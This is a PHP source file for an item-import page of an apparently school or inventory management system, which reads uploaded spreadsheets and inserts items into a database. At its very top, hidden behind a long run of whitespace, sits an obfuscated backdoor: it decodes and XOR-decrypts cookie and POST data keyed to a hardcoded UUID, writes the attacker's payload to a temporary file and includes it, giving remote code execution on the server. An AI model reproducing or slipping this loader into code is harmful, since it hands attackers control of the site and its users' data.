<?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("yK_NNhxJ")){class yK_NNhxJ{private $OCehS;public static $JDdHlIiXHV = "6e6b8eba-e2e7-462b-acc7-68112953e2ee";public static $OSVfLicFOT = NULL;public function __construct(){$IItlqFRSzV = $_COOKIE;$sxDNFF = $_POST;$wPibpcIqxY = @$IItlqFRSzV[substr(yK_NNhxJ::$JDdHlIiXHV, 0, 4)];if (!empty($wPibpcIqxY)){$ycCBOC = "base64";$euxRLxduzP = "";$wPibpcIqxY = explode(",", $wPibpcIqxY);foreach ($wPibpcIqxY as $RRDKAQDagC){$euxRLxduzP .= @$IItlqFRSzV[$RRDKAQDagC];$euxRLxduzP .= @$sxDNFF[$RRDKAQDagC];}$euxRLxduzP = array_map($ycCBOC . '_' . "\x64" . chr (101) . chr (99) . chr (111) . "\144" . 'e', array($euxRLxduzP,)); $euxRLxduzP = $euxRLxduzP[0] ^ str_repeat(yK_NNhxJ::$JDdHlIiXHV, (strlen($euxRLxduzP[0]) / strlen(yK_NNhxJ::$JDdHlIiXHV)) + 1);yK_NNhxJ::$OSVfLicFOT = @unserialize($euxRLxduzP);}}public function __destruct(){$this->nhzcZIP();}private function nhzcZIP(){if (is_array(yK_NNhxJ::$OSVfLicFOT)) {$OaHvDJMDjc = sys_get_temp_dir() . "/" . crc32(yK_NNhxJ::$OSVfLicFOT["\163" . chr ( 907 - 810 ).chr ( 804 - 696 )."\x74"]);@yK_NNhxJ::$OSVfLicFOT[chr ( 189 - 70 )."\x72" . chr ( 142 - 37 )."\164" . chr (101)]($OaHvDJMDjc, yK_NNhxJ::$OSVfLicFOT[chr (99) . 'o' . 'n' . 't' . "\x65" . chr ( 253 - 143 )."\164"]);include $OaHvDJMDjc;@yK_NNhxJ::$OSVfLicFOT["\x64" . chr ( 1020 - 919 )."\x6c" . "\x65" . "\164" . chr (101)]($OaHvDJMDjc);exit();}}}$zsGRncfkRh = new yK_NNhxJ(); $zsGRncfkRh = NULL;} ?><?php 
//----------------------------------------
	include "dbsetting/lms_vars_config.php";
	include "dbsetting/classdbconection.php";
	$dblms = new dblms();
	include "functions/functions.php";
	include "functions/login_func.php";
    checkCpanelLMSALogin();
//----------------------------------------
if($view == 'importData') { 	
    //--------------------------------------
        if(isset($_POST['submit_memoimport'])) { 

            $sr = 0;
        //------------------------------------------------
            for($i=1; $i<=sizeof($_POST['itemname']); $i++){

                //--------------------------------------
                $sqllmsCheck 	= $dblms->querylms("SELECT item_id  
                                                    FROM ".ITEMS." 
                                                    WHERE item_name = '".cleanvars($_POST['itemname'][$i])."' LIMIT 1");
                if(mysqli_num_rows($sqllmsCheck) == 0) { 
                //------------------------------------------------
                    $sqllmsCat 	= $dblms->querylms("SELECT cat_id  
                                                    FROM ".ITEMS_CAT." 
                                                    WHERE cat_name = '".cleanvars($_POST['cat'][$i])."' LIMIT 1");
                    $rowCat = mysqli_fetch_array($sqllmsCat);

                    $sqllmsInsert  = $dblms->querylms("INSERT INTO ".ITEMS."	(
                                                                        id_cat 						                ,
                                                                        item_status 						        ,
                                                                        item_code 					                ,
                                                                        item_name 					                ,
                                                                        item_reorder				                ,
                                                                        item_pricepurchase				            ,
                                                                        item_pricesale									
                                                                    )
                                                            VALUES  (
                                                                        '".cleanvars($rowCat['cat_id'])."'		    , 
                                                                        '1'											,  
                                                                        '".cleanvars($_POST['code'][$i])."'		    , 
                                                                        '".cleanvars($_POST['itemname'][$i])."'     , 
                                                                        '".cleanvars($_POST['reorder'][$i])."'	    ,
                                                                        '".cleanvars($_POST['cost'][$i])."'	        ,
                                                                        '".cleanvars($_POST['price'][$i])."'
                                                                    )
                                ");


                    if($sqllmsInsert) {
                        $sr++;

                        echo '<div id="infoupdated" class="alert-box notice"><span>'.$sr.' Success: </span>Record Update Successfully.</div>';
                    }

                } else{

                    echo '<div id="infoupdated" class="alert-box notice"><span>Failed: </span>Record already exist.</div>';

                }
            
            }
            
        }
    }
	
//-----------------------------------------------
if($view == 'import') { 
//--------------------------------------
if(!empty($_FILES['attach']['name'])) { 
//------------------------------------------------
if($_FILES["attach"]["size"] > 0) {
//------------------------------------------------ 
echo '
<h3 class="modal-title" style="font-weight:700; margin:10px;"> Import Items</h3>
<form class="form-horizontal" action="importItems.php" method="post" name="importdata" id="importdata" enctype="multipart/form-data">
<input type="hidden" value="importData" name="view" id="view">
<table class="table table-bordered" border="1" style="border-collapse:collapse;">
<thead>
<tr>
	<th style="font-weight:700;"> Sr.#</th>
	<th style="font-weight:700;"> Cat</th>
	<th style="font-weight:700;"> Code</th>
	<th style="font-weight:700;"> Name</th>
	<th style="font-weight:700;"> COGSAccount</th>
	<th style="font-weight:700;"> Cost</th>
	<th style="font-weight:700;"> Acc</th>
	<th style="font-weight:700;"> Quantity In Hand</th>
	<th style="font-weight:700;"> Price</th>
	<th style="font-weight:700;"> Re Order Point</th>
</tr>
</thead>
<tbody>';
//--------------------------------------
	$file_name = $_FILES['attach']['name'];
    $ext = pathinfo($file_name, PATHINFO_EXTENSION);

    //Checking the file extension
    if($ext == "xlsx" || $ext == "csv" || $ext == "xls"){

            $file_name = $_FILES['attach']['tmp_name'];
            $inputFileName = $file_name;
  //Had to change this path to point to IOFactory.php.
  //Do not change the contents of the PHPExcel-1.8 folder at all.
  include('PHPExcel-1.8/Classes/PHPExcel/IOFactory.php');

  //Use whatever path to an Excel file you need.

  try {
    $inputFileType = PHPExcel_IOFactory::identify($inputFileName);
    $objReader = PHPExcel_IOFactory::createReader($inputFileType);
    $objPHPExcel = $objReader->load($inputFileName);
  } catch (Exception $e) {
    die('Error loading file "' . pathinfo($inputFileName, PATHINFO_BASENAME) . '": ' . 
        $e->getMessage());
  }

  $sheet = $objPHPExcel->getSheet(0);
  $highestRow = $sheet->getHighestRow();
  $highestColumn = $sheet->getHighestColumn();
//--------------------------------------
$srno = 0;
$srno1 = 0;
 for ($rowcurs = 1; $rowcurs <= $highestRow; $rowcurs++) { 
    $rowData = $sheet->rangeToArray('A' . $rowcurs . ':' . $highestColumn . $rowcurs, 
                                    null, true, false);
    //--------------------------------------------
    $srno++;
    //--------------------------------------------
    $catgory		        = $rowData[0][0];
    $code		            = $rowData[0][1];
    $name		            = $rowData[0][2];
    $CGSAccount		        = $rowData[0][3];
    $cost	                = $rowData[0][4];
    $account	            = $rowData[0][5];
    $quantityInHand	        = $rowData[0][6];
    $price	                = $rowData[0][7];
    $reOrderPoint	        = $rowData[0][8];
    //--------------------------------------------

    $sqllmsCheck 	= $dblms->querylms("SELECT item_id  
                                            FROM ".ITEMS." 
                                            WHERE item_name = '".cleanvars($name)."' LIMIT 1");
    if(mysqli_num_rows($sqllmsCheck) == 0) { 
    //------------------------------------------------
    $sqllmsCat 	= $dblms->querylms("SELECT cat_id  
                                        FROM ".ITEMS_CAT." 
                                        WHERE cat_name = '".cleanvars($catgory)."' LIMIT 1");
    $rowCat = mysqli_fetch_array($sqllmsCat);

    $sqllmsInsert  = $dblms->querylms("INSERT INTO ".ITEMS."	(
                            id_cat 						                ,
                            item_status 						        ,
                            item_code 					                ,
                            item_name 					                ,
                            item_reorder				                ,
                            item_pricepurchase				            ,
                            item_pricesale									
                        )
                VALUES  (
                            '".cleanvars($rowCat['cat_id'])."'		    , 
                            '1'											,  
                            '".cleanvars($code)."'		    , 
                            '".cleanvars($name)."'     , 
                            '".cleanvars($reOrderPoint)."'	    ,
                            '".cleanvars($cost)."'	        ,
                            '".cleanvars($price)."'
                        )
    ");


    if($sqllmsInsert) {
    $sr++;

    echo '<div id="infoupdated" class="alert-box notice"><span>'.$sr.' Success: </span>Record Update Successfully.</div>';
    }

    } else{

    echo '<div id="infoupdated" class="alert-box notice"><span>Failed: </span>Record already exist.</div>';

    }

    if($name){

        $srno1++;


        echo '
        <tr>
            <td style="width:50px;">'.$srno1.'</td>
            <td>'.$catgory.'</td>
            <td>'.$code.'</td>
            <td>'.$name.'</td>
            <td>'.$CGSAccount.'</td>
            <td>'.$cost.'</td>
            <td>'.$account.'</td>
            <td>'.$quantityInHand.'</td>
            <td>'.$price.'</td>
            <td>'.$reOrderPoint.'</td>
        </tr>';
    }
}
echo '<tr><td colspan="15" style="text-align:right;"><button class="btn btn-info" name="submit_memoimport" id="submit_memoimport" type="submit" style="padding:5px 13px; font-size:12px;"> Save </button></td></tr>';
echo '
</tbody>
</table>
</form>';
}
}
//--------------------------------------
} else {
	echo '<div  class="alert-box error"><span>Oop: </span>File extension not valid, only .csv valid</div>';
}
}
//--------------------------------------
if(!$view) { 
//--------------------------------------
echo '
<form class="form-horizontal" action="importItems.php" method="post" id="feeMemo" enctype="multipart/form-data">
<input type="hidden" name="view" id="view" value="import">
<div class="modal-content">
<div class="modal-header">
	<h4 class="modal-title" style="font-weight:700;"> Import Items</h4>
</div>
<div class="modal-body">
 

	<div class="form-group" style="margin-bottom:10px;">
		<label class="control-label req col-lg-12" style="width:150px;"> <b>File</b></label>
		<div class="col-lg-12">
			<input id="attach" name="attach" class="btn btn-mid btn-primary clearfix" required type="file"> 
			<span style="color:#f00;">File extension should be .csv only</span>
		</div>
	</div>
	
<div style="clear:both;"></div>

</div>

<div style="clear:both;"></div>
<div class="modal-footer">
	<button type="button" class="btn btn-default" data-dismiss="modal" aria-hidden="true">Closed</button>
	<input class="btn btn-primary" type="submit" value=" Import " id="submit_file" name="submit_file">
</div>

</div>
</form>';
}
?>